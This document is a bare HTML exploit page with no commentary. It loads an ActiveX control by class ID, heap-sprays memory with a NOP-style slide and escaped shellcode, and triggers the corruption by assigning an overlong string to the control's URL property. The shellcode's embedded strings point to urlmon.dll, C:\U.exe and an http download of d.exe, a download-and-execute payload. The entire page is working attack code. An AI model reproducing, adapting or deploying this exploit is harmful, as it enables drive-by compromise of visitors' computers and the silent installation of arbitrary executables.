<html>
<body>
<object classid="clsid:F3D0D36F-23F8-4682-A195-74C92B03D4AF" name="evil" 
width=100 height=200>
</object>
<script>
var heapSprayToAddress = 0x05050505;
var shellcode = unescape("%u9090"+"%u9090"+
"%u54eb%u758b%u8b3c%u3574%u0378%u56f5%u768b%u0320" +
"%u33f5%u49c9%uad41%udb33%u0f36%u14be%u3828%u74f2" +
"%uc108%u0dcb%uda03%ueb40%u3bef%u75df%u5ee7%u5e8b" +
"%u0324%u66dd%u0c8b%u8b4b%u1c5e%udd03%u048b%u038b" +
"%uc3c5%u7275%u6d6c%u6e6f%u642e%u6c6c%u4300%u5c3a" +
"%u2e55%u7865%u0065%uc033%u0364%u3040%u0c78%u408b" +
"%u8b0c%u1c70%u8bad%u0840%u09eb%u408b%u8d34%u7c40" +
"%u408b%u953c%u8ebf%u0e4e%ue8ec%uff84%uffff%uec83" +
"%u8304%u242c%uff3c%u95d0%ubf50%u1a36%u702f%u6fe8" +
"%uffff%u8bff%u2454%u8dfc%uba52%udb33%u5353%ueb52" +
"%u5324%ud0ff%ubf5d%ufe98%u0e8a%u53e8%uffff%u83ff" +
"%u04ec%u2c83%u6224%ud0ff%u7ebf%ue2d8%ue873%uff40" +
"%uffff%uff52%ue8d0%uffd7%uffff%u7468%u7074%u2f3a" +
"%u312f%u3732%u302e%u302e%u312e%u742f%u7365%u2f74" +
"%u2e64%u7865%u0065");
var heapBlockSize = 0x400000;
var payLoadSize = shellcode.length * 2;
var spraySlideSize = heapBlockSize - (payLoadSize+0x38);
var spraySlide = unescape("%u0505%u0505");
spraySlide = getSpraySlide(spraySlide,spraySlideSize);
heapBlocks = (heapSprayToAddress - 0x400000)/heapBlockSize;
memory = new Array();
for (i=0;i<heapBlocks;i++)
{
memory = spraySlide + shellcode;
}

try
{ var a=new Array(813);
a=a+"7rBJ"+"aaaaaaaaaccccccccccccccccccccccccccvvvvvvvvvvvvvvvvvvvvvvvvvvvbbbbbbbbbbbbbbbbbbbbbbnnnnnnnnnnnnnnnnnnnnnnnnnnnnhhhhhhhhhhhhhhhhhhhhhhhhhh";
document.write(evil.URL=a);
}
catch(e){}
function getSpraySlide(spraySlide, spraySlideSize)
{
while (spraySlide.length*2<spraySlideSize)
{
spraySlide += spraySlide;
}
spraySlide = spraySlide.substring(0,spraySlideSize/2);
return spraySlide;
}
</script>
</body>
</html>

